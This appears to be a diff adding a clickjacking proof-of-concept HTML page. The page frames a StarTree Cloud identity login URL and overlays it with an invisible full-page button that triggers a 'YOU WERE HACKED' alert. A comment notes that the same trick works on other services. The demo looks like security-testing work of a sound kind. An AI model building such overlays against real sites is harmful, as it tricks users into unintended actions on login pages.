@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link href="https://startree.ai/favicons/favicon-32x32.png" rel="shortcut icon">
+    <title>StarTree Cloud</title>
+    <style>
+        html {
+            overflow: auto;
+        }
+
+        html, body, div, iframe {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            border: none;
+        }
+
+        iframe {
+            display: block;
+            width: 100%;
+            border: none;
+            overflow-y: auto;
+            overflow-x: hidden;
+        }
+
+        button {
+            border: 0px solid transparent;
+            background-color: transparent;
+            color: transparent;
+            font-size: 1.5em;
+            /*box-shadow: 0 6px 6px rgba(0, 0, 0, 0.6);*/
+        }
+    </style>
+    <script>
+        function showAlert() {
+            alert('YOU WERE HACKED - CYRIL');
+        }
+    </script>
+</head>
+<body>
+<iframe style="position: absolute;" src="https://identity.demo.teprod.startree.cloud/auth"></iframe>
+<button onclick="showAlert()" style="position:absolute; width: 100%; height: 100%"></button>
+<!-- also work on thirdeye and identity -->
+<script>
+    var iframe = document.getElementsByTagName("iframe")[0];
+</script>
+</body>
+</html>
